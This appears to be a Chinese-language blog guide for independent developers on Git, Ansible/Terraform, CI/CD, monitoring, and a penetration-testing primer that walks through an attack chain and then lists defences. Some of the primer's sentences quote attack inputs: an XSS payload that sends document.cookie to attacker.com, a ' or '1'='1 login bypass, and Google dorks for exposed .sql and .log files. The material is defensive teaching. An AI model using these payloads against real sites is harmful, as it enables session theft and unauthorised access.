Git版本控制

Git 是一个分布式版本控制系统，它会在本地完整记录你的项目每次修改的历史快照，让你可以随时回溯任意版本、创建多条独立分支并行开发、与团队成员同步代码，并在多台设备间自由协作而无需始终依赖中央服务器。

工具 类型 说明
Git 版本控制系统 本地管理代码历史，核心工具
GitHub 托管平台 云端存储 Git 仓库，基于 Git 的社交化平台
GitLab 托管平台 类似 GitHub，提供更多 DevOps 功能（CI/CD、容器仓库）

简单类比的话Git就是相机的存储卡（本地记录），而GitHub/GitLab 就是 云相册（远程备份、协作）

分支管理（核心功能）

Git 的分支功能，简单来说就是允许你在同一个仓库里开辟出多条并行的“开发线”，每条线可以独立工作，互不干扰。

分支就是让同一个仓库里的代码可以同时沿着多条互不干扰的线路并行开发的功能，每条线路独立记录自己的修改，可以随时在不同线路之间切换，最后再把某条线路上的成果合并回主线路，从而实现多人协作、功能隔离和实验安全。

基础设施即代码

相信在个人开发过程中，很多独立开发者最头疼的往往不是敲代码的过程，而是事无巨细配置环境的过程，尤其是看一眼阿里云那繁杂的页面。到底有什么方法可以较为轻松的自动配置需要的机器？并且还能自动化安装配置我们需要的代码运行环境？带着这样的需求，Ansible 和 Terraform应运而生。

  1. Ansible 是一个自动化运维工具，通过 SSH 连接服务器，用声明式的 YAML 脚本（Playbook）批量完成软件安装、配置管理、应用部署等“配置类”任务，强调“无代理”架构和操作的幂等性；
  2. Terraform 是一个基础设施即代码工具，通过声明式的 HCL 配置定义云资源（如服务器、网络、数据库），并调用云厂商 API 完成资源的“创建与编排”，强调资源生命周期管理和状态追踪。

简单来说，Ansible 负责“在已有服务器上配置环境”，Terraform 负责“创建和管理服务器本身”。

比如上云：

  • 创建 VPC —— Terraform
  • 创建子网、路由表 —— Terraform
  • 创建 ECS 虚机 —— Terraform
  • 给虚机装 Nginx、改配置、发版本 —— Ansible
  • 做系统巡检、批量改参数 —— Ansible

这俩不是互相替代，是互相补位。

工具 类型 主要功能
Terraform 编排/ provisioning 创建和管理基础设施（服务器、数据库、网络等）
Ansible 配置管理/ configuration 在已有服务器上安装软件、配置文件、部署应用

其他常见 IaC 工具对比：

工具 类型 特点
Terraform 基础设施编排 多云支持，状态管理，生态丰富
Ansible 配置管理 无代理，基于 SSH，简单易学
Pulumi 基础设施编排 用编程语言（Python/TS/Go）写 IaC
CloudFormation 基础设施编排 AWS 原生，仅支持 AWS
Chef/Puppet 配置管理 更复杂的配置管理，需要代理
Kubernetes 容器编排 管理容器化应用，也可做 IaC

这也是基础设施即代码（Infrastructure as Code，IaC）概念的由来：用代码（配置文件）来管理服务器、网络、数据库等基础设施优势：版本控制、可重复、自动化、减少人为错误。

CICD流水线

笔者有个朋友，是个独立开发者，一个人包揽了产品到运维的所有角色。他的日常是这样的：写完功能 → 本地跑一遍 → npm run build → FTP 拖文件或 scp 传服务器 → SSH 登录 → pm2 restart all → 盯着日志等服务起来。这套流程他做了无数次，早已形成肌肉记忆。虽然繁琐，但一个人嘛，慢点就慢点。

直到有一次，他在修复线上紧急 Bug 时，手忙脚乱把测试配置打包进了生产环境。用户登录不了，订单下不了，等他回滚过来，二十分钟过去了。这不是他第一次栽在手动操作上——忘记跑测试、构建到一半网络断了、凌晨两点爬起来修 Bug，修完部署又卡住了……

他问我：“如果代码一推送到 GitHub，它就自动测试、自动构建、自动部署，只需要写代码、提交代码，剩下的全自动，那该多好？”，我突然意思到这不就几天前读到的DevOps思想持续交付2.0：业务引领的DevOps精要（增订本） - 乔梁 - 微信读书吗？那些重复的、机械的、容易出错的事，本来就不该由人来做。

概述

CI/CD 流水线是一套自动化的软件交付流程，将“持续集成”和“持续部署/交付”串联起来，

  • CI（持续集成）:开发者提交代码后，自动运行测试、构建，尽早发现集成问题
  • CD（持续部署/交付）：自动将通过测试的代码部署到服务器，快速、安全地发布新版本

在代码提交后自动执行代码构建、单元测试、静态检查、安全扫描、镜像打包、部署到测试环境、运行集成测试，最终经人工确认或自动判定后发布到生产环境，整个流程通过 Jenkins、GitLab CI、GitHub Actions 等工具定义为声明式的管道脚本，确保每一次代码变更都能以标准化、可重复、可追溯的方式快速且安全地交付到用户手中，从而缩短从开发到上线的周期、降低人工操作错误率、提升软件交付质量和效率。

工具 特点 适用场景
GitHub Actions 与 GitHub 深度集成，免费额度大 GitHub 仓库项目
GitLab CI 与 GitLab 集成 GitLab 仓库项目
Jenkins 自托管，高度可定制 复杂企业环境
CircleCI 速度快，配置简洁 需要快速构建
Travis CI 开源项目免费 开源项目

这里简单介绍一下GitHub Actions。

GitHub Actions

GitHub Actions 是 GitHub 内置的 CI/CD 平台，允许在代码仓库中直接配置自动化工作流，在特定事件触发时自动执行构建、测试、部署等任务。它让“自动化”变得像写配置文件一样简单，无需搭建独立的 CI 服务器。

能力 说明
原生集成 与 GitHub 仓库深度集成，无需额外账号或服务
事件驱动 支持 push、pull_request、issues、schedule 等数十种触发事件
矩阵构建 可同时在多个操作系统、Node 版本、环境变量下并行测试
丰富的生态 GitHub Marketplace 提供上万种预置的 Actions 可以直接复用
免费额度 公开仓库完全免费，私有仓库每月也有一定免费额度

核心概念

概念 说明 示例
Workflow 整个自动化流程 ci.yml 文件定义的工作流
Event 触发工作流的事件 push、pull_request、schedule
Job 一组步骤，可以并行或串行 test、build、deploy
Step 单个任务，可以运行命令或使用 Action run: npm test
Action 可复用的任务模块 actions/checkout@v4
Runner 运行任务的虚拟机 ubuntu-latest、windows-latest

监控与日志

笔者有个好朋友hermes，是个独立开发者，一直过着“小而美”的惬意日子。他开发的 Next.js 应用跑在一台 2 核 2G 的服务器上，用户不多，流量平缓，日子倒也安稳。

那时候，他的运维方式很“原始”也很直接——出问题了，就 SSH 登上服务器，敲几行命令：

偶尔再用浏览器 F12 看看接口耗时，感觉“够用了”。毕竟，用户少，问题少，手动查一查总能找到原因。

直到有一天，他的应用突然“爆了”——不知道哪个博主推荐了一下，流量瞬间翻了 10 倍。他先是窃喜，然后很快笑不出来了：

  • 用户反馈页面打不开、接口超时
  • 他自己也一脸懵：到底是 CPU 不够？还是数据库连接池爆了？还是哪个 API 被疯狂刷？
  • 登上服务器，top 一看，CPU 飘红，但不知道是哪个请求导致的
  • 翻日志，几千行报错堆在一起，根本看不清故障从什么时候开始的
  • 更崩溃的是，问题只在高峰期出现，等他一顿操作猛如虎登上服务器，流量已经回落了，故障现场“完美消失”

过去那套“人肉运维”的方式，在面对突发流量时，暴露出三个致命短板：

  1. 被动响应，后知后觉 ：没有告警，永远都是用户先发现故障，他才知道出事了。等他登录服务器，可能已经过去了十几分钟，甚至错过了故障现场。

  2. 信息孤岛，无法关联 ：CPU 飙高时，不知道是哪个接口导致的；日志报错时，不知道当时的系统指标长什么样。指标、日志、调用链是割裂的，全靠人脑“脑补”关联。

  3. 手动操作，效率低下 ：每个问题都要手动敲命令、翻日志、查资料，故障处理时间动辄半小时以上。对于独立开发者来说，这段时间用户流失了多少，他根本不敢算。

当我得知他现在最想要的其实是：

  • 能 24 小时自动盯着系统，异常时主动告诉他，而不是等用户投诉
  • 能在一个界面上同时看到 CPU、请求量、响应时间、错误日志，而不是到处切窗口
  • 能回溯故障发生那一刻的完整现场，而不是靠“猜”和“回忆”

听着他的需求，我果断推荐了 Prometheus + Grafana + ELK 。

  • Prometheus 负责 7×24 小时采集指标，主动告警
  • Grafana 把散落的指标变成直观的仪表盘
  • ELK 把海量日志集中管理，让故障可追溯、可分析

用完他对我说：“早知道有这套东西，我就不至于这两天失眠了。”

Prometheus + Grafana

Prometheus

Prometheus 是一个开源的系统监控和告警工具包，最初由 SoundCloud 开发，现为 CNCF（云原生计算基金会）的毕业项目，是云原生监控的事实标准。

Getting started | Prometheus

特性 说明
多维数据模型 通过指标名称和键值对标签（如 method="GET"、status="500"）来标识时间序列
PromQL 查询语言 强大灵活的查询语言，支持聚合、运算、预测等复杂分析
拉取模式 主动从目标系统（ exporters ）拉取指标，而非被动接收
独立运行 不依赖外部存储，自带时序数据库
服务发现 自动发现监控目标（支持 Kubernetes、Consul、DNS 等）
告警管理 通过 Alertmanager 实现告警分组、静默、路由

其通过HTTP协议周期性抓取被监控组件的状态。输出被监控组件信息的HTTP接口称为exporter。常用组件大部分都有exporter可以直接使用，比如haproxy,nginx，Mysql,Linux系统信息（包括磁盘、内存、CPU、网络等待）。

虽然 Prometheus 提供的 Web UI 也可以很好的查看不同指标的视图，但是这个功能非常简单，只适合用来调试。要实现一个强大的监控系统，还需要一个能定制展示不同指标的面板，能支持不同类型的展现方式（曲线图、饼状图、热点图、TopN 等），这就是仪表盘（Dashboard）功能。

因此 Prometheus 开发了一套仪表盘系统 PromDash，不过很快这套系统就被废弃了，官方开始推荐使用 Grafana 来对 Prometheus 的指标数据进行可视化，这不仅是因为 Grafana 的功能非常强大，而且它和 Prometheus 可以完美的无缝融合。

Grafana

Grafana 是一个开源的可视化分析平台，支持连接多种数据源，将监控数据以仪表盘、图表的形式直观展示。

Grafana OSS 和 Enterprise | Grafana 文档 - Grafana 文档

特性 说明
多数据源支持 Prometheus、Elasticsearch、MySQL、PostgreSQL、Loki、CloudWatch 等 50+ 种
丰富的面板类型 时间序列图、柱状图、统计表、热力图、地图、日志面板等
交互式仪表盘 拖拽式构建、变量筛选、时间范围选择、钻取分析
告警可视化 支持在图表上直接配置告警规则
用户与权限 支持团队协作、角色权限控制
注释与协作 在图表上标注事件（如部署、故障），支持团队评论

渗透测试

攻击链

知己知彼，方能百战不殆。作为独立开发者，了解攻击者的攻击流程对于网站的防御至关重要。

整个渗透测试的攻击流程，可以理解为一条从“外部未知”到“内部控制”的完整攻击链，通常遵循以下几个标准阶段。对于独立开发者来说，理解这个链条，就能知道在哪个环节设防最有效。

第一阶段：信息收集——攻击开始前的“踩点”

在真正动手之前，攻击者会像侦探一样，尽可能多地收集公开信息。

他们会先确定你的网站域名，然后通过DNS查询找出服务器IP地址。接着会用Nmap等工具扫描这个IP，看看你开放了哪些端口（比如22端口的SSH、80端口的HTTP、443端口的HTTPS、3306端口的MySQL）。

同时，他们会访问你的网站，查看前端代码、HTTP响应头，从中推断你的技术栈（比如用的是Nginx还是Apache，PHP还是Node.js）。

他们还会在GitHub上搜索你的域名或项目名，看看有没有程序员不小心把数据库密码或API密钥提交到公开仓库。如果运气好，甚至能通过Google搜索找到你泄露的敏感文件，比如site:yourdomain.com ext:sql或ext:log。这个阶段的目标就是描绘出你的网络轮廓，找到所有可能被利用的入口点。

概念 是什么 应对措施
端口扫描 探测你的服务器开放了哪些端口（22 SSH、80 HTTP、443 HTTPS、3306 MySQL等） 需要知道。检查自己是否暴露了不该暴露的端口（如 3306 对外网开放）
漏洞扫描 用工具自动检测已知漏洞（如过期的 Nginx 版本、有漏洞的库） 建议用免费工具跑一遍（如 Nikto、Nmap 的 vuln 脚本）
抓包分析 拦截并查看 HTTP 请求/响应内容 需要会。用 Chrome DevTools 的 Network 面板就够了，了解敏感数据是否明文传输

第二阶段：漏洞探测——寻找第一块多米诺骨牌

有了目标信息后，攻击者开始系统地寻找漏洞。他们会用专门的安全工具扫描你的网站，寻找已知的Web漏洞，比如SQL注入点、XSS注入点、文件上传点。

对于你使用的第三方库和框架，他们会检查版本号，然后去国家漏洞数据库（NVD）搜索这个版本有没有公开的已知漏洞。他们还会尝试访问一些敏感路径，比如/admin、/phpmyadmin、/.env、/backup.zip。

如果网站有登录功能，他们会尝试SQL注入绕过（输入' or '1'='1作为密码）或暴力破解弱口令。这个阶段的目标是找到任何一个可以突破的薄弱环节。

第三阶段：漏洞利用——撬开第一道门

一旦发现确认可利用的漏洞，攻击者就会发起实际攻击。

如果是SQL注入，他们可能直接用sqlmap工具拖出整个数据库，拿到所有用户信息和密码哈希。

如果是文件上传漏洞，他们会尝试上传一个Webshell（比如shell.php），然后通过浏览器访问这个文件，在服务器上执行任意命令。如果是XSS漏洞，他们会构造一段恶意脚本，比如<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>，想办法让你或你的用户触发。

如果是信息泄露，比如找到了.env文件，他们会直接用里面泄露的数据库密码远程连接你的数据库。这个阶段的目标是获得对服务器或数据的初步控制权。

第四阶段：权限维持——装上“后门”防止被踢

拿到初步权限后，攻击者知道管理员可能很快就会发现并修复漏洞，所以他们会想办法留个“后门”，确保下次还能进来。

常见的手段包括：在你的服务器上创建一个隐藏的、有最高权限的后门账号；在定时任务（crontab）里写入一个反向连接的脚本，每隔几分钟自动连接攻击者的服务器；

在Web目录里隐藏一个Webshell，并给它起一个迷惑性的名字，比如images/avatar.jpg.php。更高级的做法是修改系统文件或内核模块，但独立开发者遇到的攻击通常不会到这个级别。这个阶段的目标是建立持久化控制，即使你删除了原来的漏洞文件，攻击者依然能回来。

第五阶段：横向移动与提权——从“小兵”变成“将军”

如果攻击者一开始拿到的只是一台普通Web服务器的权限，他们不会满足。他们会尝试扩大战果，也就是“提权”和“横向移动”。

所谓提权，就是从普通用户（比如Web服务运行的用户www-data）提升到系统管理员（root）。他们可能会寻找系统里配置错误、有SUID权限的程序，或者利用内核漏洞来提权。所谓横向移动，就是从这台Web服务器跳转到同一网络下的其他服务器，比如数据库服务器、缓存服务器。

他们可能在Web服务器上找到了数据库的连接密码，然后用这个密码去连接数据库服务器，从而拿到更核心的用户数据。如果你的整个应用都部署在同一台服务器上（很多独立开发者就是这样做的），这一步就省了，因为他们已经拿到了全部。这个阶段的目标是控制尽可能多的机器，并获取最高权限。

第六阶段：数据窃取与破坏——最终目的达成

到了最后一步，攻击者会达成他们的真实目的。

如果是窃取数据，他们会打包下载数据库（用户信息、订单记录），或者在文件系统中寻找敏感文档（密钥文件、配置文件），然后压缩、分块、加密，通过DNS隧道、HTTP隐蔽通道等方式悄悄传走。

如果是勒索破坏，他们会加密你的数据库和文件，然后留下勒索信。如果是用于挖矿，他们会安装挖矿程序，消耗你的CPU资源。

如果是SEO污染或钓鱼，他们会在你的网站上插入黑链或伪造的登录页面。这个阶段的目标已经不再是技术挑战，而是直接的经济或政治利益。

一条完整的攻击链信息收集 → 漏洞探测 → 漏洞利用 → 权限维持 → 横向移动与提权 → 数据窃取与破坏

对于独立开发者来说，最关键的防御点在前三个阶段：

  • 信息收集阶段：不要泄露敏感信息（.env、备份文件、调试信息）
  • 漏洞探测阶段：及时更新依赖库，关闭不必要的端口和服务
  • 漏洞利用阶段：做好鉴权、输入过滤、文件类型校验

如果应用能防住前三个阶段，绝大多数脚本小子和自动化攻击工具就已经被挡在门外了。

常见攻击方式

根据攻击目标的不同，可以把攻击分为四大类：

大类 攻击目标 典型攻击方式
应用层攻击 Web 应用代码逻辑 SQL注入、XSS、CSRF、SSRF、XXE
身份与访问攻击 用户账号、权限体系 暴力破解、撞库、会话劫持、JWT伪造、越权
网络与基础设施攻击 服务器、带宽、网络设备 DDoS、中间人攻击、DNS劫持、端口扫描
供应链与依赖攻击 第三方库、开源组件、CI/CD 依赖库投毒、镜像劫持、构建流程篡改

作为独立开发者，在开发过程中就要留意一些安全问题，尽量避免出现问题交给运维处理：

  • SQL 注入：确认自己用了参数化查询或 ORM，尽量少拼接字符串

  • XSS：确认用户输入的内容展示时做了转义【输出时进行 HTML 转义 + 设置 Cookie HttpOnly】

各框架内置转义：

框架 默认行为 注意事项
React JSX 自动转义 不要用 dangerouslySetInnerHTML
Vue 模板自动转义 不要用 v-html
Angular 自动转义 不要用 [innerHTML]
Django 模板自动转义 用 {{ variable }} 安全，`
Jinja2 默认转义 用 {{ variable }} 安全

设置 Cookie HttpOnly（防止 JS 读取 Cookie）：

  • CSRF：确认关键操作（修改密码、删除数据、转账）有额外校验【关键操作增加 CSRF Token 或 SameSite Cookie】
SameSite 值 效果
Strict 完全禁止跨站携带 Cookie（最安全，但可能影响正常跳转）
Lax 允许从外部链接跳转进来时携带（推荐，平衡安全和体验）
None 允许跨站携带（必须配合 Secure）
  • 文件上传：如果允许上传，确认文件类型被严格限制（多层限制 + 重命名 + 隔离存储）

  • 登录接口：确认有频率限制，错误信息不暴露用户是否存在【频率限制 + 统一错误信息 + 验证码】

  • 敏感信息：确认没有 .env、*.log、*.sql 暴露在公网【环境变量 + 文件权限 + 访问控制】

  • 依赖漏洞：运行 npm audit 或 pip-audit 检查第三方库【定期运行审计工具 + 自动更新】

同时注意DDoS，攻击者控制成千上万台被感染的机器（僵尸网络），同时向服务器发送海量请求，耗尽服务器的带宽、CPU、连接数或应用资源，导致正常用户无法访问。

类型 攻击目标 攻击方式 典型特征
流量型攻击 网络带宽 UDP反射放大、NTP放大、DNS放大 把小请求放大几十倍甚至几百倍，塞满带宽
连接型攻击 服务器连接数 SYN Flood、ACK Flood 不断发半连接请求，耗尽连接池
应用层攻击 CPU/数据库 HTTP Flood、慢速攻击（Slowloris） 发起看似正常的HTTP请求，但每个请求都消耗大量CPU

现实情况是独立开发者无法靠自己的单台服务器防御 DDoS，因为攻击者的带宽可能是个人的几百倍。

所以不要把服务器直接暴露在公网上，而是让专业的云服务商帮你扛流量。比如使用 CDN（Cloudflare 免费版）或者使用云厂商的高防 IP（被攻击时临时开启）

防御层次 具体措施 成本 效果
第一层：CDN 兜底 套 Cloudflare 免费版 免费 扛住大部分中小型 DDoS
第二层：限流+封禁 Nginx 限流 + Fail2ban 免费 防脚本小子、慢速攻击
第三层：系统优化 SYN Cookie、连接队列 免费 提升抗压能力
第四层：临时高防 按需购买云高防 IP 按天/月付费 扛大流量（被打再开）
第五层：架构优化 静态文件走 CDN，动态请求无状态化，便于水平扩容 开发成本 提升整体承载能力

鉴权

渗透测试的核心目标之一，就是绕过或破解鉴权机制。所以有必要了解一些鉴权知识。

先分清三个容易混淆的词：

概念 英文 是什么 通俗理解
认证 Authentication 验证你是谁 出示身份证（登录、人脸识别）
授权 Authorization 验证你能干什么 你的工牌能进哪些房间（普通用户 vs 管理员）
鉴权 两者合称 认证 + 授权 先确认你是谁，再确认你能做什么

如果只做了认证（用户登录了），没做授权（登录后能访问所有人的数据）。结果用户A改个URL里的ID就能看到用户B的订单。

常见鉴权方案：

方案 原理 适合场景 独立开发者推荐度
Session/Cookie 服务器存 session，浏览器存 cookie 传统 Web 应用（如 Laravel、Rails） 适合纯 Web
JWT（JSON Web Token） 服务器不存状态，token 自带用户信息 分布式系统、移动 APP、前后端分离 适合 SPA/APP
OAuth 2.0 第三方登录（用 Google/GitHub 登录） 不想自己管密码、需要第三方授权 强烈推荐
API Key 给第三方调用者一个固定密钥 开放 API、服务间调用 只能用于机器对机器
Basic Auth 每次请求带用户名:密码（Base64编码） 内部工具、简单测试 生产环境不推荐（必须配合 HTTPS）

Session/Cookie

优点是成熟、可控、可以主动注销，但需要服务器存 session（内存或 Redis），不适合水平扩展

JWT

优点是无状态、适合分布式、移动端友好但是无法主动注销（只能等过期）、JWT 被偷就凉了

OAuth 2.0（第三方登录）

推荐可以用 Google、GitHub、微信扫码登录，不要自己存密码。省去了密码加密、找回密码、防止撞库等一系列麻烦。

总之上线前，逐条确认：

  • 所有需要登录的接口，都校验了 session/JWT
  • 所有涉及资源的接口（如 /order/123），都校验了当前用户是否有权访问该资源
  • 没有用自增 ID 直接暴露给前端（或做了权限校验）
  • Cookie 设置了 HttpOnly、Secure、SameSite=Lax
  • JWT 使用了强密钥，过期时间不超过 1 天（建议 1-2 小时 + refresh）
  • 登录接口有频率限制
  • 密码重置 token 是随机生成、短时效、一次性
  • 不使用 Basic Auth 暴露密码
  • 全站 HTTPS
  • 密码存储用 bcrypt 或 argon2（不要用 MD5）
  • 必要时针对请求参数进行前端加密处理
